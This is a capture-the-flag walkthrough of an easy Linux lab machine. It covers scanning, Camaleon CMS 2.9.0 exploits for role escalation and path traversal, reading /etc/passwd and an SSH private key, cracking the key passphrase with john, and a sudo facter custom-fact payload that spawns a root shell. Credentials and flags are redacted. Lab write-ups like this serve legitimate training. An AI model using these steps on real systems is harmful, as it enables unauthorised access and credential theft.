```Description
Season - 10 Machine 
Facts  - Easy   - ·Linux
```
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

## IP-Address
```bash
10.129.245.61
```
## Set MTU
```bash
$sudo ip link set dev tun0 mtu 1200
```
## RustScan
```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
54321/tcp open  http    syn-ack ttl 62 Golang net/http server
```
## Gobuster
```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,json,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.cvsignore           (Status: 200) [Size: 11128]
/.bashrc              (Status: 200) [Size: 11119]
/.cvs                 (Status: 200) [Size: 11110]
/.bash_history        (Status: 200) [Size: 11137]
/.forward             (Status: 200) [Size: 11122]
/.git                 (Status: 200) [Size: 11110]
/.history             (Status: 200) [Size: 11122]
/.htaccess            (Status: 200) [Size: 11125]
/.htpasswd            (Status: 200) [Size: 11125]
/.listing             (Status: 200) [Size: 11122]
/.passwd              (Status: 200) [Size: 11119]
/.perf                (Status: 200) [Size: 11113]
/.profile             (Status: 200) [Size: 11122]
/.rhosts              (Status: 200) [Size: 11119]
/.ssh                 (Status: 200) [Size: 11110]
/.subversion          (Status: 200) [Size: 11131]
/.svn                 (Status: 200) [Size: 11110]
/.web                 (Status: 200) [Size: 11110]
/400                  (Status: 200) [Size: 6685]
/404                  (Status: 200) [Size: 4836]
/422                  (Status: 200) [Size: 8380]
/500                  (Status: 200) [Size: 7918]
/CVS                  (Status: 200) [Size: 11110]
/admin.json           (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.txt            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/ajax                 (Status: 200) [Size: 0]
/ajax.json            (Status: 200) [Size: 0]
/ajax.php             (Status: 200) [Size: 0]
/ajax.txt             (Status: 200) [Size: 0]
/captcha              (Status: 200) [Size: 6436]
/captcha.json         (Status: 200) [Size: 3602]
/captcha.php          (Status: 200) [Size: 1589]
/captcha.txt          (Status: 200) [Size: 5552]
/en                   (Status: 200) [Size: 11109]
/en.php               (Status: 200) [Size: 11121]
/en.txt               (Status: 500) [Size: 7918]
/en.json              (Status: 200) [Size: 2162]
/error                (Status: 500) [Size: 7918]
/index                (Status: 200) [Size: 11113]
/index.php            (Status: 200) [Size: 11125]
/index.json           (Status: 200) [Size: 2162]
/index.txt            (Status: 500) [Size: 7918]
/page.txt             (Status: 500) [Size: 7918]
/page.json            (Status: 200) [Size: 5062]
/page.php             (Status: 200) [Size: 19613]
/page                 (Status: 200) [Size: 19593]
/post.json            (Status: 200) [Size: 708]
/post                 (Status: 200) [Size: 11308]
/post.php             (Status: 200) [Size: 11320]
/post.txt             (Status: 500) [Size: 7918]
/robots.json          (Status: 500) [Size: 46]
/robots.php           (Status: 200) [Size: 33]
/robots               (Status: 200) [Size: 33]
/robots.txt           (Status: 200) [Size: 99]
/robots.txt           (Status: 200) [Size: 99]
/rss.json             (Status: 200) [Size: 183]
/rss                  (Status: 200) [Size: 183]
/rss.php              (Status: 200) [Size: 183]
/rss.txt              (Status: 200) [Size: 183]
/search.json          (Status: 200) [Size: 4695]
/search.php           (Status: 200) [Size: 19207]
/search.txt           (Status: 500) [Size: 7918]
/search               (Status: 200) [Size: 19187]
/sitemap.json         (Status: 500) [Size: 46]
/sitemap              (Status: 200) [Size: 3508]
/sitemap.php          (Status: 200) [Size: 2090]
/sitemap.xml          (Status: 200) [Size: 3508]
/sitemap.txt          (Status: 500) [Size: 7918]
/up.txt               (Status: 200) [Size: 73]
/up.json              (Status: 200) [Size: 73]
/up                   (Status: 200) [Size: 73]
/up.php               (Status: 200) [Size: 73]
/welcome              (Status: 200) [Size: 11966]
/welcome.json         (Status: 200) [Size: 2162]
===============================================================
Finished
===============================================================
```
- On Browser, We found `Login`
```URL
http://facts.htb/admin/Login
```
- Sign up on the Admin page as `test:test`
- After Login in, I assigned as `client` access
- And on `http://facts.htb/admin/dashboard` 
- We Found `Camaleon CMS` & `Version: 2.9.0`
### CMS
There are 2 Vulnerabilities we found with this version `2.9.0`
- #CVE-2024-46987 - Path Traversal 
- #CVE-2025-2304 - Role change & S3 Bucket
- Lets Try #CVE-2025-2304 First
```Github
https://github.com/Alien0ne/CVE-2025-2304
```
Clone This Repo
```bash
$ python3 exploit.py -u http://facts.htb -U test -P test -e -r
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 5
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: [access key omitted]
   s3 secret key: [secret key omitted]
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
   User ID: 5
   User Role: client
```
- Got The `S3` Bucket `Credentials`
```Info
- Extracting S3 Credentials
   s3 access key: [access key omitted]
   s3 secret key: [secret key omitted]
   s3 endpoint: http://localhost:54321
- Minio Found 
```
- Install Minio 
```bash
$wget https://dl.min.io/client/mc/release/linux-amd64/mc
$chmod +x mc
$sudo mv mc /usr/local/bin/
```
- Access the Bucket
```bash
$ mc alias set facts http://facts.htb:54321 \
[access key omitted] \
[secret key omitted]

Added `facts` successfully.

$ mc alias list
facts
  URL       : http://facts.htb:54321
  AccessKey : [access key omitted]
  SecretKey : [secret key omitted]
  API       : s3v4
  Path      : auto
  Src       : /home/kali/.mc/config.json
```
- Explore the Bucket
```bash
$ mc ls facts
[2025-09-11 08:06:52 EDT]     0B internal/
[2025-09-11 08:06:52 EDT]     0B randomfacts/

└─$ mc ls facts/internal/
[2026-01-08 13:45:13 EST]   220B STANDARD .bash_logout
[2026-01-08 13:45:13 EST] 3.8KiB STANDARD .bashrc
[2026-01-08 13:47:17 EST]    20B STANDARD .lesshst
[2026-01-08 13:47:17 EST]   807B STANDARD .profile
[2026-02-06 20:27:10 EST]     0B .bundle/
[2026-02-06 20:27:10 EST]     0B .cache/
[2026-02-06 20:27:10 EST]     0B .ssh/

└─$ mc ls facts/internal/.ssh/
[2026-02-06 17:07:08 EST]    82B STANDARD authorized_keys
[2026-02-06 17:07:08 EST]   464B STANDARD id_ed25519
```
- Got the `Private_key`
`$mc cat facts/internal/.ssh/id_ed25519`
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```
- It is encrypted 
```bash
$nano id_ed25519
$ssh2john id_ed25519 > hash.txt
$john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[passphrase omitted]      (id_ed25519)
1g 0:00:05:40 DONE (2026-02-06 20:35) 0.002934g/s 9.389p/s 9.389c/s 9.389C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

- #CVE-2024-46987 - Path Traversal Second
- Found the Github - `https://github.com/Goultarde/CVE-2024-46987/CVE-2024-46987.py`
```bash
$git clone https://github.com/Goultarde/CVE-2024-46987.git
Cloning into 'CVE-2024-46987'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (4/4), done.
$ cd CVE-2024-46987
$ ls
CVE-2024-46987.py  README.md
```
- Explore Path traversal `/etc/passwd`
```bash
$python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```
- Got the 2 Users - `Trivia` & `William`
- Lets explore `SSH` keys for `Trivia` as it has better SUID `1000` 
```bash
$ python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /home/trivia/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```
- How did we know file name is `id_ed25519`
- `ED25519` is default on new ones
- `id_ed25519` Decode as `[passphrase omitted]`

```bash
$ ssh -i id_ed25519 trivia@facts.htb
The authenticity of host 'facts.htb (10.129.245.61)' can't be established.
ED25519 key fingerprint is SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ed25519': [passphrase omitted]
```

## User Flag
```bash
trivia@facts:~$ pwd
/home/trivia
trivia@facts:~$ ls
trivia@facts:~$ cd ..
trivia@facts:/home$ ls
trivia  william
trivia@facts:/home$ cd william/
trivia@facts:/home/william$ ls
user.txt
trivia@facts:/home/william$ cat user.txt
[flag omitted]
trivia@facts:/home/william$
```
- Flag
```Flag
[flag omitted]
```

### Privilege Escalation
```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
trivia@facts:~$ cat /usr/bin/facter
#!/usr/bin/ruby
# frozen_string_literal: true

require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)

CliLauncher.start(processed_arguments)
trivia@facts:~$
```
- Ruby load path (`-I`) hijacking
- **Custom facts execution** ← 🔥 THIS ONE 
- Using `--custom-dir` can run custom Files as root 
- Arbitrary Ruby code execution as root
```bash
trivia@facts:~$ mkdir /tmp/pwn
cat << 'EOF' > /tmp/pwn/root.rb
Facter.add(:root_shell) do
  setcode do
    system("/bin/bash")
  end
end
EOF
trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/pwn
root@facts:/home/trivia#
```
- Got the Root
## Root Flag
```bash
root@facts:/home/trivia# ls
root@facts:/home/trivia# cd
root@facts:~# ls
minio-binaries  ministack  root.txt  snap
root@facts:~# cat root.txt
[flag omitted]
```
- Flag
```Flag
[flag omitted]
```
# END